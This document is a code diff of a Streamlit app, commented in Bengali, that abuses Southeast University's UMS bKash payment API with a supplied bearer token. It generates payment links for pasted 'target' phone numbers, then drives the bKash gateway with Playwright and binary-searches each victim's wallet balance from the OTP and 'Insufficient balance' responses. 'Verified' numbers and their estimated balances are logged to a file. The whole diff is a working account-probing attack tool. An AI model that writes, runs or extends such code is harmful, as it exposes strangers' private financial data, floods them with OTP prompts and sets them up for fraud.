@@ -1,10 +1,11 @@
 import streamlit as st
 import asyncio
-from playwright.async_api import async_playwright
-import sys
+import json
 import os
 import re
-import json
+import sys
+import requests
+from playwright.async_api import async_playwright
 
 # --- প্রিমিয়াম পৃষ্ঠা কনফিগারেশন এবং ম্যাকওএস-স্টাইল লেআউট ---
 st.set_page_config(
@@ -80,7 +81,7 @@ st.markdown("""
             box-shadow: inset 0 0 30px rgba(0, 229, 255, 0.03), 0 10px 30px rgba(0,0,0,0.5);
         }
         
-        .stTextInput>div>div>input, .stTextArea>div>div>textarea, .stSelectbox>div>div {
+        .stTextInput>div>div>input, .stTextArea>div>div>textarea, .stNumberInput>div>div>input {
             background: rgba(255, 255, 255, 0.02) !important;
             border: 1px solid rgba(255, 255, 255, 0.08) !important;
             color: #FFF !important;
@@ -109,134 +110,236 @@ st.markdown("""
     </div>
 """, unsafe_allow_html=True)
 
-@st.cache_resource
-def initialize_browser_pipeline():
+# --- নম্বর পার্সিং লজিক ---
+def clean_and_parse_numbers(raw_input):
+    raw_tokens = re.split(r'[\s,;\t]+', raw_input)
+    valid_numbers = []
+    for token in raw_tokens:
+        digits_only = re.sub(r'\D', '', token)
+        if digits_only.startswith('880'):
+            digits_only = digits_only[2:]
+        elif digits_only.startswith('1') and len(digits_only) == 10:
+            digits_only = '0' + digits_only
+
+        if len(digits_only) > 11 and digits_only.startswith('01'):
+            digits_only = digits_only[:11]
+
+        if len(digits_only) == 11 and digits_only.startswith('01'):
+            if digits_only not in valid_numbers:
+                valid_numbers.append(digits_only)
+    return valid_numbers
+
+# --- এপিআই লিঙ্ক জেনারেটর ফাংশন (টোকেন ফ্রন্টএন্ড থেকে ডাইনামিকালি নিবে) ---
+def get_seu_bkash_url(mobile, amount, token):
     try:
-        os.system(f"{sys.executable} -m playwright install chromium")
-        return True
-    except Exception as e:
-        st.error(f"Pipeline Engine Initialization Failed: {e}")
-        return False
-
-engine_ready = initialize_browser_pipeline()
-
-# --- অ্যাডভান্সড ডাইনামিক ব্যাকএন্ড স্ক্যানার লজিক ---
-async def scan_matrix_node(target_number, clean_token, api_endpoint, req_method, raw_payload_template):
-    async with async_playwright() as p:
-        try:
-            browser = await p.chromium.launch(
-                headless=True,
-                args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
-            )
-            
-            clean_token = clean_token.replace("Bearer ", "").replace('"', '').replace("'", "").strip()
-            
-            headers = {
-                "Authorization": f"Bearer {clean_token}",
-                "Accept": "application/json, text/plain, */*",
-                "Content-Type": "application/json;charset=UTF-8",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-                "Origin": "https://ums.seu.edu.bd",
-                "Referer": "https://ums.seu.edu.bd/"
+        url = "https://ums-api-service.seu.edu.bd/accounts/v/2.0.0/online-payment/bkash-pay"
+        payload = {
+            "amount": float(amount),
+            "gateway": "bkash",
+            "initiator": "online-payment",
+            "actionUrl": None,
+            "applicationApply": {
+                "onlineApplicationType": None,
+                "urgentApplication": None,
+                "mobile": mobile,
+                "email": None,
+                "copies": None
             }
-            
-            context = await browser.new_context(extra_http_headers=headers)
-            page = await context.new_page()
-            
-            # মেথড অনুযায়ী ডাইনামিক ইউআরএল বা পে-লোড হ্যান্ডলিং
-            if req_method == "GET":
-                # যদি ইউআরএল এর শেষে নম্বর প্যারামিটার হিসেবে যুক্ত করতে হয়
-                final_url = api_endpoint.replace("{number}", target_number) if "{number}" in api_endpoint else f"{api_endpoint}?phone={target_number}"
-                try:
-                    resp = await page.goto(final_url, wait_until="networkidle", timeout=12000)
-                    status_code = resp.status if resp else 500
-                    res_data = await resp.json()
-                except Exception:
-                    status_code = 500
-                    res_data = None
-            else:
-                # POST মেথডের জন্য কাস্টম পে-লোড জেনারেট করা
-                processed_payload = raw_payload_template.replace("{number}", target_number)
-                try:
-                    payload_json = json.loads(processed_payload)
-                except Exception:
-                    payload_json = {"phone": target_number}
-                
-                try:
-                    response = await page.evaluate(f"""
-                        async () => {{
-                            const res = await fetch('{api_endpoint}', {{
-                                method: 'POST',
-                                headers: {{
-                                    'Authorization': 'Bearer {clean_token}',
-                                    'Content-Type': 'application/json'
-                                }},
-                                body: JSON.stringify({json.dumps(payload_json)})
-                            }});
-                            if (res.status === 401 || res.status === 403) return {{ status: res.status }};
-                            return {{ status: res.status, data: await res.json().catch(() => null) }};
-                        }}
-                    """)
-                    status_code = response.get("status", 500)
-                    res_data = response.get("data", None)
-                except Exception:
-                    status_code = 500
-                    res_data = None
+        }
+        auth_header = token if "Bearer" in token else f"Bearer {token}"
+        headers = {
+            "Content-Type": "application/json",
+            "Authorization": auth_header,
+            "Origin": "https://ums.seu.edu.bd",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        }
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        if response.status_code == 200:
+            result = response.json()
+            return result.get('data', {}).get('gatewayRedirectLink')
+        return None
+    except Exception:
+        return None
 
-            await browser.close()
-            
-            if status_code in [401, 403]:
-                return {"status": "auth_error", "message": "Token Invalid or UMS Service Outage."}
-            elif status_code == 200:
-                return {"status": "success", "data": res_data if res_data else "Node Connected Successfully"}
-            else:
-                return {"status": "failed", "message": f"HTTP Gateway Server Status {status_code}"}
-                
-        except Exception as e:
-            if 'browser' in locals():
-                await browser.close()
-            return {"status": "error", "message": str(e)}
+# --- বিকাশ গেটওয়ে প্লেরাইট চেকার ফাংশন ---
+async def execute_gateway_check(page, number, bkash_url):
+    try:
+        await page.goto(bkash_url, wait_until="domcontentloaded", timeout=15000)
+        await page.wait_for_selector("#WALLET", timeout=10000)
+        await page.fill("#WALLET", number)
 
-# --- মডার্ন এবং রেসপন্সিভ গ্রিড ইন্টারফেস লেআউট ---
+        confirm_btn = page.locator("button.btn-group__btn-confirm")
+        await confirm_btn.click()
+
+        for _ in range(40):
+            await asyncio.sleep(0.1)
+            content = await page.content()
+            if "Verification" in content or "OTP" in content or "VERIFICATION" in content or "Total" in content:
+                return "SUCCESS"
+            elif "Insufficient balance" in content or "not eligible" in content or "failed" in content.lower():
+                return "INSUFFICIENT"
+        return "TIMEOUT"
+    except Exception:
+        return "ERROR"
+
+# --- মডার্ন ইন্টারফেস লেআউট গ্রিড ---
 left_panel, right_panel = st.columns([1, 1.1], gap="large")
 
 with left_panel:
     st.markdown("<div class='glass-panel'>", unsafe_allow_html=True)
-    st.markdown("### 🔑 System Authorization & Endpoint")
+    st.markdown("### 🔑 System Authorization")
     
     if 'locked_token' not in st.session_state:
         st.session_state.locked_token = ""
         
     token_input = st.text_input(
-        "Bearer Auth Token Array:", 
+        "Bearer Auth Token:", 
         value=st.session_state.locked_token, 
         type="password", 
-        placeholder="eyJhbGciOiJIUzUxMiJ9.eyJzdWIi..."
+        placeholder="eyJhbGciOiJIUzUxMiJ9..."
     )
     
-    # 🌟 নতুন ডাইনামিক ফিল্ডসমূহ (এন্ডপয়েন্ট টিউনিংয়ের জন্য)
-    api_endpoint = st.text_input("📡 Target API Endpoint Gateway:", value="https://ums-api-service.seu.edu.bd/accounts/v/2.0.0/online-payment/bkash-pay")
-    req_method = st.selectbox("🌐 HTTP Request Method:", ["POST", "GET"])
-    
-    raw_payload_template = ""
-    if req_method == "POST":
-        raw_payload_template = st.text_area("📦 Custom JSON Payload (Use {number} as placeholder):", value='{\n  "amount": 2000.0,\n  "gateway": "bkash",\n  "initiator": "online-payment",\n  "actionUrl": null,\n  "applicationApply": {\n    "onlineApplicationType": null,\n    "urgentApplication": null,\n    "mobile": "{number}",\n    "email": null,\n    "copies": null\n  }\n}', height=160)
-    
-    if st.button("🔒 Save & Verify Gateway Access Engine", use_container_width=True):
+    if st.button("🔒 Lock Gateway Access Token", use_container_width=True):
         if token_input:
-            st.session_state.locked_token = token_input.replace("Bearer ", "").strip()
-            st.toast("Authorization and Endpoint Configurations Latched!", icon="🚀")
+            st.session_state.locked_token = token_input.strip()
+            st.toast("Authorization Token Locked!", icon="🚀")
         else:
-            st.warning("Please insert a secure token stream.")
+            st.warning("Please insert a valid token stream.")
+    st.markdown("</div>", unsafe_allow_html=True)
+
+    st.markdown("<div class='glass-panel'>", unsafe_allow_html=True)
+    st.markdown("### ⚙️ Scan Ranges & Config")
+    col1, col2 = st.columns(2)
+    with col1:
+        MIN_AMOUNT = st.number_input("Min Balance Range:", value=2000, step=1000)
+    with col2:
+        MAX_AMOUNT = st.number_input("Max Balance Range:", value=100000, step=1000)
+    ROUND_STEP = 1000
     st.markdown("</div>", unsafe_allow_html=True)
 
     st.markdown("<div class='glass-panel'>", unsafe_allow_html=True)
     st.markdown("### 📥 Matrix Feed Targets")
-    data_feed = st.text_area("Paste Target Phone Numbers:", height=120, placeholder="01723436943\n01329132803")
+    data_feed = st.text_area("Paste Target Phone Numbers (Any Format):", height=130, placeholder="01723436943, 01329132803")
     
-    target_numbers = re.findall(r'(?:013|014|015|016|017|018|019)\d{8}', data_feed)
+    target_numbers = clean_and_parse_numbers(data_feed) if data_feed else []
     st.markdown(f"<p style='color: #00E5FF; font-size:13px; font-family: \"Fira Code\", monospace; margin: 5px 0 0 0;'>🔍 Filtered Active Nodes: {len(target_numbers)}</p>", unsafe_allow_html=True)
     st.markdown("</div>", unsafe_allow_html=True)
+
+# --- কোর রানার এবং লাইভ টার্মিনাল লগিং মেকানিজম ---
+async def start_pipeline_scan(target_numbers, token, terminal_placeholder):
+    terminal_output = "⏳ [SYSTEM LOG]: Initializing async cluster matrix pipeline...\n"
+    terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
+    
+    success_accounts = []
+
+    async with async_playwright() as p:
+        browser = await p.chromium.launch(
+            headless=True,
+            args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
+        )
+        context = await browser.new_context()
+        page = await context.new_page()
+
+        for number in target_numbers:
+            terminal_output += f"\n📡 [TARGET]: Starting Smart Scan for -> {number}\n"
+            terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
+
+            low_idx = MIN_AMOUNT // ROUND_STEP
+            high_idx = MAX_AMOUNT // ROUND_STEP
+            estimated_balance = 0
+            is_valid_user = False
+            request_count = 0
+
+            # ১. প্রথম ক্রাইটেরিয়া চেকিং লুপ
+            while True:
+                init_url = get_seu_bkash_url(number, MIN_AMOUNT, token)
+                if not init_url:
+                    terminal_output += f"  ├─ [API ERROR]: Link generation failed. Retrying in 2s...\n"
+                    terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
+                    await asyncio.sleep(2)
+                    continue
+
+                init_status = await execute_gateway_check(page, number, init_url)
+                request_count += 1
+
+                if init_status == "SUCCESS":
+                    is_valid_user = True
+                    estimated_balance = MIN_AMOUNT
+                    terminal_output += f"  ├─ Initial Criteria Met: {MIN_AMOUNT} BDT [OK]\n"
+                    break
+                elif init_status == "INSUFFICIENT":
+                    terminal_output += f"  └─ [SKIPPED]: Minimum balance of {MIN_AMOUNT} BDT not available.\n"
+                    break
+                else:
+                    terminal_output += f"  ├─ [{init_status}]: Gateway glitch. Retrying node...\n"
+                    terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
+                    await asyncio.sleep(2)
+                    continue
+            
+            terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
+
+            # ২. বাইনারি সার্চ লুপ
+            if is_valid_user:
+                while low_idx <= high_idx:
+                    mid_idx = (low_idx + high_idx) // 2
+                    mid_amount = mid_idx * ROUND_STEP
+
+                    if mid_amount <= MIN_AMOUNT:
+                        low_idx = mid_idx + 1
+                        continue
+
+                    while True:
+                        terminal_output += f"  ├─ Querying Matrix (Req #{request_count + 1}): {mid_amount} BDT... "
+                        terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
+
+                        bkash_url = get_seu_bkash_url(number, mid_amount, token)
+                        if not bkash_url:
+                            terminal_output += "[API Mismatch - Retrying]\n"
+                            await asyncio.sleep(2)
+                            continue
+
+                        status = await execute_gateway_check(page, number, bkash_url)
+
+                        if status in ["SUCCESS", "INSUFFICIENT"]:
+                            request_count += 1
+                            if status == "SUCCESS":
+                                terminal_output += "[SUCCESS]\n"
+                                estimated_balance = mid_amount
+                                low_idx = mid_idx + 1
+                            elif status == "INSUFFICIENT":
+                                terminal_output += "[LOW BALANCE]\n"
+                                high_idx = mid_idx - 1
+                            break
+                        else:
+                            terminal_output += f"[{status} - Retrying Same Node...]\n"
+                            terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
+                            await asyncio.sleep(2)
+                            continue
+
+                    terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
+                    await asyncio.sleep(0.3)
+
+                terminal_output += f"🏆 [FINAL RESULT]: {number} -> {estimated_balance} BDT (Reqs: {request_count})\n"
+                success_accounts.append({
+                    "Index": len(success_accounts) + 1,
+                    "Target Number": number,
+                    "Estimated Balance (BDT)": f"{estimated_balance} /-",
+                    "Total Requests": request_count,
+                    "Status": "Verified ✅"
+                })
+                
+                # রিয়েলটাইম ফাইলে সেভ রাখা
+                with open("active_accounts.txt", "a") as f:
+                    f.write(f"Number: {number} | Estimated Balance: {estimated_balance} BDT | Requests Made: {request_count} | Status: Verified\n")
+
+            terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
+            await asyncio.sleep(0.5)
+
+        await browser.close()
+        terminal_output += "\n🏁 [COMPLETE]: Pipeline execution finished cleanly.\n"
+        terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
+        
+    return success_accounts
 
 with right_panel:
     st.markdown("<div class='glass-panel' style='height: 100%;'>", unsafe_allow_html=True)
@@ -248,48 +351,21 @@ with right_panel:
     terminal_placeholder.markdown("<pre class='terminal-box'>[SYSTEM LOG]: System standing by. Awaiting live cluster node deployment...</pre>", unsafe_allow_html=True)
     st.markdown("</div>", unsafe_allow_html=True)
 
-# --- কোর এক্সিকিউশন ও লাইভ টার্মিনাল স্ট্রিমিং ---
+# --- ট্রিগার কন্ট্রোল ---
 if run_scan:
     if not st.session_state.locked_token:
-        st.error("[CRITICAL ERROR]: Pipeline Core Missing Token Database. Action Refused.")
+        st.error("[CRITICAL ERROR]: Pipeline Core Missing Token. Action Refused.")
     elif not target_numbers:
-        st.warning("[WARNING]: Empty Feed Queue. Scan framework could not identify targets.")
+        st.warning("[WARNING]: Empty Feed Queue. No numbers identified.")
     else:
-        terminal_output = "⏳ [SYSTEM LOG]: Initializing core cluster matrix pipeline...\n"
-        terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
+        # রান করার সময় অ্যাসিনক্রোনাসলি স্ট্রীম হবে
+        hits = asyncio.run(start_pipeline_scan(target_numbers, st.session_state.locked_token, terminal_placeholder))
         
-        success_accounts = []
-        
-        for number in target_numbers:
-            terminal_output += f"📡 [TARGET]: Scanning Matrix Node → {number}\n"
-            terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
-            
-            # ডাইনামিক মেথডসহ ব্যাকএন্ড ক্রলার এক্সিকিউশন
-            result = asyncio.run(scan_matrix_node(number, st.session_state.locked_token, api_endpoint.strip(), req_method, raw_payload_template))
-            
-            if result["status"] == "auth_error":
-                terminal_output += f"   ❌ [AUTH MISM_ERR]: Token Invalid or UMS Service Outage.\n"
-            elif result["status"] == "success":
-                terminal_output += f"   🔥 [SUCCESS]: Node Verified. Data Connected.\n"
-                success_accounts.append({
-                    "Index": len(success_accounts) + 1,
-                    "Target Node": number, 
-                    "Status": "ACTIVE HIT", 
-                    "Payload Log": str(result["data"])
-                })
-            else:
-                terminal_output += f"   ⚠️ [NODE_ERR]: {result['message']}\n"
-                
-            terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
-            
-        terminal_output += "🏁 [SYSTEM LOG]: Target Scan Deployment Terminal Sequence Finished.\n"
-        terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
-
         # --- লাইভ সাকসেস ডাটা গ্রিড প্যানেল ---
         st.markdown("<div class='glass-panel'>", unsafe_allow_html=True)
         st.markdown("### 📊 Live Hits & Verified Accounts Grid")
-        if success_accounts:
-            st.dataframe(success_accounts, use_container_width=True)
+        if hits:
+            st.dataframe(hits, use_container_width=True)
         else:
             st.markdown("<p style='color:#ef4444; font-family:\"Fira Code\", monospace; font-size:14px; margin:0;'>❌ No successful active matrix data payload caught in this deployment frame.</p>", unsafe_allow_html=True)
         st.markdown("</div>", unsafe_allow_html=True)
